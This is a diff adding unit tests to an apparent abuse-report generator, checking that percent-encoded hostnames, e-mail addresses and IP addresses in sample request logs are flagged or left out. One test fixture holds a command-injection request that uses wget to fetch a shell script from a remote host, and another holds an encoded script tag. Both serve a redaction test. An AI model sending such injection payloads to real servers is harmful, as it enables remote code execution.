@@ -723,6 +723,16 @@ class Validator(unittest.TestCase):
         with mock.patch.object(m, "OWN_NAME_MARKERS", ()):
             self.assertEqual(self.errs([good_row(Comment="host chat.example.org probed")]), [])
 
+    def test_percent_encoded_names_and_ip_are_rejected_by_the_validator(self):
+        with mock.patch.object(m, "OWN_NAME_MARKERS", ("example.org",)):
+            self.has(self.errs([good_row(Comment="GET /x?h=www%2Eexample%2Eorg -> 404")]), "example.org")
+            self.has(self.errs([good_row(Comment="GET /x?h=www%252Eexample%252Eorg -> 404")]), "example.org")
+            self.assertEqual(self.errs([good_row(Comment="GET /a%20b?q=%3Cx%3E -> 404")]), [])
+        self.has(self.errs([good_row(Comment="GET /c?x=8%2E8%2E4%2E4 -> 404")]), "IP address")
+        e, w, _ = m.validate_csv_text(to_text([good_row(Comment="GET /r?u=jane%40mail.example.net -> 404")]))
+        self.assertEqual(e, [])
+        self.assertTrue(w)                                                    # the e-mail warning sees it too
+
     def test_other_ip_in_comment_is_allowed(self):
         self.assertEqual(self.errs([good_row(Comment="CONNECT 1.2.3.4:443 -> 400")]), [])
 
@@ -790,6 +800,18 @@ class Generated(unittest.TestCase):
         buf = io.StringIO(newline="")
         m.write_csv(buf, rows_for([a]))
         self.assertEqual(m.validate_csv_text(buf.getvalue())[0], [])
+
+
+class DecodedViews(unittest.TestCase):
+    def test_views(self):
+        self.assertEqual(m.decoded_views("plain"), ["plain"])
+        self.assertEqual(m.decoded_views("a%2Eb"), ["a%2Eb", "a.b"])
+        self.assertEqual(m.decoded_views("a%252Eb"), ["a%252Eb", "a%2Eb", "a.b"])
+        self.assertEqual(len(m.decoded_views("a%25252Eb")), 3)                # at most two rounds
+
+    def test_broken_sequences_never_raise(self):
+        for text in ("%", "%zz", "100%", "%e9%", "%ff%fe", "%00", ""):
+            self.assertIsInstance(m.decoded_views(text), list, text)
 
 
 class SampleLeaks(unittest.TestCase):
@@ -877,6 +899,27 @@ class SampleLeaks(unittest.TestCase):
             self.one("8.8.8.8", ["/a.example.org", "/b?ip=8.8.8.8", "/fine"])
         self.assertIn("omitted 2 sample requests", err.getvalue())
         self.assertNotIn("example.org", err.getvalue())
+
+    def test_percent_encoded_own_name_is_omitted_too(self):
+        # %2E is a dot: a plain substring search for "example.org" does not see it.
+        c = self.one("8.8.8.8", ["/ok", "/x?h=www%2Eexample%2Eorg", "/y?h=www%252Emyhost%252Eexample", "/fine"])
+        self.assertIn("Sample requests: GET /ok -> 404; GET /fine -> 404", c)
+        self.assertNotIn("%2E", c.upper())
+        self.assertNotIn("example", c.lower())
+
+    def test_percent_encoded_email_is_omitted(self):
+        c = self.one("8.8.8.8", ["/ok", "/reset?user=jane%40mail.example.net"])
+        self.assertIn("Sample requests: GET /ok -> 404", c)
+        self.assertNotIn("jane", c)
+
+    def test_percent_encoded_reported_ip_is_omitted(self):
+        c = self.one("8.8.8.8", ["/ok", "/cgi?cmd=wget%20http://8%2E8%2E8%2E8/x.sh"])
+        self.assertIn("Sample requests: GET /ok -> 404", c)
+        self.assertNotIn("wget", c)
+
+    def test_ordinary_percent_encoding_is_left_alone(self):
+        c = self.one("8.8.8.8", ["/a%20b/c%2Fd?q=%3Cscript%3E"])
+        self.assertIn("GET /a%20b/c%2Fd?q=%3Cscript%3E -> 404", c)
 
     def test_clean_reports_are_unchanged(self):
         c = self.one("8.8.8.8", ["/a", "/b"])
